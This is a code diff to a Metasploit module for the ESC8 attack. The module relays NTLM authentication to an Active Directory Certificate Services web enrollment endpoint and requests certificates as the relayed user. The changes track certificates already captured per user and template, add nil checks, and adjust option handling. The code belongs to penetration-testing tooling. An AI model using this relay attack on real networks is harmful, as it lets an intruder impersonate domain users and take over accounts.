@@ -41,17 +41,17 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('TIMEOUT', [ true, 'Seconds to wait for a response.', 20])
       ]
     )
-    register_advanced_options(
-      [
-        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
-
-      ]
-    )
-    deregister_options('SMBServerIdleTimeout', 'RHOSTS', 'SMBPass', 'SMBUser', 'CommandShellCleanupCommand', 'AutoVerifySession')
+    deregister_options('SMBServerIdleTimeout',
+                       'RHOSTS',
+                       'SMBPass',
+                       'SMBUser',
+                       'CommandShellCleanupCommand',
+                       'AutoVerifySession',
+                       'HttpUsername',
+                       'HttpPassword')
   end
 
   def initial_handshake?
-    vprint_status('Verifying HTTP Relay target Has Web Enrollment enabled')
     res = send_request_cgi(
       {
         'rhost' => datastore['RELAY_TARGET'],
@@ -63,14 +63,15 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    return false if res.code != 401
+    return false if res.nil? || res.code != 401
 
     return true
   end
 
   def start_service(opts = {})
+    @issued_certs = {}
     unless initial_handshake?
-      fail_with(Failure::UnexpectedReply, "#{datastore['RELAY_TARGET']} does not appear to have Web enrollment enabled on #{datastore['CERT_URI']}")
+      fail_with(Failure::UnexpectedReply, "#{datastore['RELAY_TARGET']} does not appear to have Web Enrollment enabled on #{datastore['CERT_URI']}")
     end
 
     ntlm_provider = HTTPRelayNTLMProvider.new(
@@ -108,10 +109,6 @@ class MetasploitModule < Msf::Auxiliary
     return request
   end
 
-  def exit_with_error(_error_string)
-    print_error
-  end
-
   def post_login_action(kwargs = {})
     authenticated_username = kwargs[:authenticated_username]
     authenticated_http_client = kwargs[:authenticated_http_client]
@@ -125,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error('esc8_relay: Failed to authenticate')
       return nil
     end
-    if authenticated_username.nil?
+    if authenticated_domain.nil?
       print_error('esc8_relay: Post Login Action requires an authenticated domain')
       return nil
     end
@@ -147,14 +144,22 @@ class MetasploitModule < Msf::Auxiliary
     unless datastore['QUERY_ONLY']
       if cert_list.nil? || cert_list.empty? || cert_list.include?(datastore['CERT_TEMPLATE'])
         # if we don't have a cert list or if the cert is in the list, just generate that cert
-        retrieve_cert(datastore['CERT_TEMPLATE'], authenticated_username, authenticated_domain, authenticated_http_client)
+        if cert_entry?(authenticated_username, authenticated_domain, datastore['CERT_TEMPLATE'])
+          vprint_status("Cert for #{authenticated_domain}\\#{authenticated_username} using #{datastore['CERT_TEMPLATE']} already captured; skipping")
+        else
+          retrieve_cert(datastore['CERT_TEMPLATE'], authenticated_username, authenticated_domain, authenticated_http_client)
+        end
       else
         # if we have a cert list and the desired template is not there
         # or the desired template is nil, just issue all available certs
         print_bad("#{datastore['CERT_TEMPLATE']} not found in available certificates") unless datastore['CERT_TEMPLATE'].nil?
         print_status('Attempting to generate certificates for all templates')
         cert_list.each do |cert_entry|
-          retrieve_cert(cert_entry, authenticated_username, authenticated_domain, authenticated_http_client)
+          if cert_entry?(authenticated_username, authenticated_domain, cert_entry)
+            vprint_status("Cert for #{authenticated_domain}\\#{authenticated_username} using #{cert_entry} already captured; skipping")
+          else
+            retrieve_cert(cert_entry, authenticated_username, authenticated_domain, authenticated_http_client)
+          end
         end
       end
     end
@@ -174,6 +179,22 @@ class MetasploitModule < Msf::Auxiliary
       user_list.append(element[0])
     end
     return user_list
+  end
+
+  def cert_entry?(authenticated_user, authenticated_domain, cert_template)
+    auth_string = "#{authenticated_domain}\\#{authenticated_user}"
+    return false if @issued_certs[auth_string].nil? || !@issued_certs[auth_string].include?(cert_template)
+
+    return true
+  end
+
+  def add_cert_entry(authenticated_user, authenticated_domain, cert_template)
+    auth_string = "#{authenticated_domain}\\#{authenticated_user}"
+    if @issued_certs.key?(auth_string)
+      @issued_certs[auth_string] << cert_template
+    else
+      @issued_certs[auth_string] = [ cert_template ]
+    end
   end
 
   def retrieve_cert(cert_template, authenticated_user, authenticated_domain, authenticated_http_client)
@@ -200,9 +221,10 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status('Post Sent')
     if res&.code == 200 && !res.body.include?('request was denied')
       print_good("Certificate Request Granted using template #{cert_template} and user #{authenticated_user}")
+      add_cert_entry(authenticated_user, authenticated_domain, cert_template)
     else
       print_bad("Certificate Request Denied using template #{cert_template} and user #{authenticated_user}")
-      return false
+      return nil
     end
 
     location_tag = res.body.match(/^.*location="(.*)"/)[1]
